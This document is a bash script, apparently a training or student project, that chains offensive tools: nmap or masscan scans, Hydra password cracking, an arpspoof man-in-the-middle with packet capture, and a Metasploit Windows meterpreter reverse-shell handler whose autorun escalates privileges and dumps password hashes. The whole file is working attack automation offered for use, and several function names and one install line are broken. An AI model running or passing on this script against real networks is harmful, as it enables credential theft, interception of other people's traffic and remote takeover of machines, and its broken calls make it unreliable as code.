#!/bin/bash
function installlations()
{
#check whether nmap is installed.
 NMAP=$(which nmap)
	if [[ ! $NMAP ]]
	then
	echo 'Nmap tool, is not installed.'
	read -p 'Enter Y to install nmap: ' NMAPINSTALL
		if [ "$NMAPINSTALL" == "Y" ]
		then
		echo 'Installing nmap now..'
		sudo apt install nmap
		sudo updatedb
		instnmap
		else
		echo 'You dont  have Nmap installed,you want to choose another tool?'
		choosetool
		fi
	else
	echo 'nmap is installed.'
	runnmap
	fi

}

function instmasscan()
{
#check whether masscan is installed.
 MASSCAN=$(which masscan)
	if [[ ! $MASSCAN ]]
	then
	echo 'Masscan tool, is not installed.'
	read -p 'Enter Y to install masscan: ' MSINSTALL
		if [ "$MSINSTALL" == "Y" ]
		then
		echo 'Installing masscan..'
		sudo apt install masscan
		sudo updatedb
		instmasscan
		else
		echo 'You dont have Masscan installed, you want to choose another tool?'
		choosetool
		fi
	else
	echo 'Masscan is now installed.'
	runmasscan
	fi

}

function insthydra()
{
#check whether hydra is installed.
 HYDRA=$(which hydra)
	if [[ ! $HYDRA ]]
	then
	echo 'Hydra tool, is not installed.'
	read -p 'Enter Y to install hydra: ' HYDINSTALL
		if [ "$HYDINSTALL" == "Y" ]
		then
		echo 'Installing hydra..'
		sudo apt install hydra
		sudo updatedb
		insthydra
		else
		echo 'You dont  have Hydra installed,you want to choose another attack method?'
		chooseattack
		fi
	else
	echo 'Hydra is now installed.'
	runhydra
	fi

}

function instarp()
{
#check whether arpspoof is installed.
 ARP=$(which arpspoof)
	if [[ ! $ARP ]]
	then
	echo 'Arpspoof tool, is not installed.'
	read -p 'Enter Y to install arpspoof: ' ARPINSTALL
		if [ "$ARPINSTALL" == "Y" ]
		then
		echo 'Installing arpspoof..'
		sudo apt install dsniff
		sudo updatedb
		instarp
		else
		echo 'You dont have arpspoof installed,you want to choose another attack method?'
		chooseattack
		fi
	else
	echo 'Arpspoof is now installed.'
	runarp
	fi

}

function instmsfconsole()
{
#check whether msfconsole is installed.
 MSF=$(which msfconsole)
	if [[ ! $MSF ]]
	then
	echo 'msfconsole tool, is not installed.'
	read -p 'Enter Y to install msfconsole: ' MSFINSTALL
		if [ "$MSFINSTALL" == "Y" ]
		then 
		echo 'Installing msfconsle..' ##https://www.fosslinux.com/48112/install-metasploit-kali-linux.htm
		sudo apt install metasploit-framework
		sudo /etc/init.d/postgresql start 
		sudo /etc/init.d/postgresql status
		sudo updatedb
		curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb> msfinstall && chmod 755 && msfinstall && ./msfinstall
		sudo updatedb
		instmsfconsole
		else
		echo 'You dont have msfconsole installed,you want to choose another attack method?'
		chooseattack
		fi
	else
	echo 'Msfconsole is now installed.'
	runmsfconsole
	fi

}

#2a. Allow user to choose between two methods of scanning, when selected, script will check if the tool is installed.
function choosetool()
{

	read -p 'Choose the tool for scanning: NMAP (N) or MASSCAN (M): ' NMorMS
	case $NMorMS in
	N)
	instnmap
	;;
	M)
	instmasscan
	;;
	*)
	echo 'No tool chosen for scanning, exiting..'
	;;
	esac
}

#2b. Allow user to choose among 3 different network attacks to run via script, when attack tool is selected, script will check if tool is installed
function chooseattack()
{

	read -p 'Choose the tool for attack: Hydra (H), Man in the Middle (MITM) or reverse payload (RP): ' ATTACK
	case $ATTACK in
	H)
	insthydra
	;;
	MITM)
	instarp
	;;
	RP)
	instmsfconsole
	;;
	*)
	echo 'No tool chose for attack, exitng..'
	;;
	esac

}
#3. Run selected scan log executed attacks: every scan or attack should be logged and saved with the date and used arguments

#use this function for user to enter scan details like IP, PORT, filename and flags needed for scan
function scandetails()
{
	echo 'We need you to give the following details for scan..'
	read -p 'Enter the IP address to scan: ' IP
	read -p 'Specify the port range you want to scan (e.g. -p1-1000): ' PORT
	read -p 'Enter the file name you like to save the results in: ' FILENAME
	read -p 'You want to add specific flags for the scan? (e.g. -sV -sC): ' FLAGS

}

#use this function to run nmap, and log scan results.
function runmap()
{
	scandetails

	echo '**Running nmap and saving into greppable format..'
	sudo nmap $IP $PORT $FLAGS -oG $FILENAME 2>/dev/null

	echo '**Here is the nmap results:'
	cat $FILENAME

	read -p 'Would you like to run another scan? (Y/N): ' NMAPT
	case $NMAPT in
	Y)
	runmap
	;;
	*)
	echo 'Completed nmap scan, proceeding to attack tool..'
	esac
}


function runmasscan()
{
	scandetails

	echo '**Running masscan and saving into..'
	sudo masscan $IP $PORT -oG $FILENAME 2>/dev/null
	echo '**Here is the masscan results:'
	cat $FILENAME

	read -p 'Would you like to run another masscan? (Y/N): ' MS5
	case $MS5 in
	Y)
	runmasscan
	;;
	*)
	echo 'Completed masscan, proceeding to attack tool..'
	esac

}
#use this function to run hydra for specified IP, service and log results into file	
function runhydra()
{ 	read -p "Enter IP to crack: " IP
	read -p "Enter filename for hydra results: " HYDRA
	read -p "Enter user list to crack: " USERLIST
	read -p "Enter password list to crack: " WLIST
	read -p "Enter service to attack: " SERVICE
	read -p "Enter port to attack: " PORT
	echo "Now its running Hydra for open ports"

hydra -L $USERLIST -P $WLIST $IP -s $PORT $SERVICE >> $HYDRA

echo "**Here are the cracked passwords:"
cat $HYDRA | grep password:

}

#use this function to run man in the middle attack (MITM) using arpspoof based on entered IPs, user can specify the duration of MITM
function runarp()
{
	read -p "Enter router ip address you want to spoof: " ROUTERIP
	read -p "Enter User ip address you want to spoof: " USERIP
	read -p "Enter filename to capture packets: " PKTFILE
	read -p "Specify the duration (default in seconds, e.g. 5 = 5s, 5m =5min, 5h = 5 hours, 5d = 5 days) to capture packets: " TIME
	echo "You need to be root to be able to run MiTM, accessing root user"

sudo -i << HERE
echo "Here's your directory"
pwd
echo "**Enabling IP forward"
echo 1 > /proc/sys/net/ipv4/ip_forward
echo "**Currently running arp spoof and capturing packets into $PKTFILE.cap.."
	timeout $TIME arpspoof -t $USERIP $ROUTERIP &
	timeout $TIME arpspoof -t $ROUTERIP $USERIP &
	timeout $TIME tcpdump -w $PKTFILE.cap
HERE
}
#use this function to 1) create payload 2) start listener and 3) execute a series of commands automatically when there is a a session, details will be logged in a file
function runmsfconsole()
{
	echo "This will create a reverse payload for windows"
	read -p "Enter your ip address: " ATKIP
	read -p "Enter your port number: " ATKPORT
	read -p "Enter the file name for payload: " ATKFILE
	read -p "Enter file name to save log results: " RESFILE



	echo "Creating automated script for multi functions**"
	echo "run post/windows/manage/migrate
	ipconfig
	sysinfo
	run post/windows/gather/enum_shares
	run post/windows/gather/checkvm
	getsystem
	run post/windows/gather/hashdump
	background" > autorun.rc
	echo "We Done! Starting msfconsole.."
	echo "spool $RESFILE
	set AutoRunScript multi_console_command -r autorun.rc
	use exploit/multi/handler
	set payload windows/meterpreter/reverse_tcp
	set lhost $ATKIP
	set lport $ATKPORT
	run" >> runmeterpreter.rc
msfconsole -r runmeterpreter.rc


}

choosetool
chooseattack
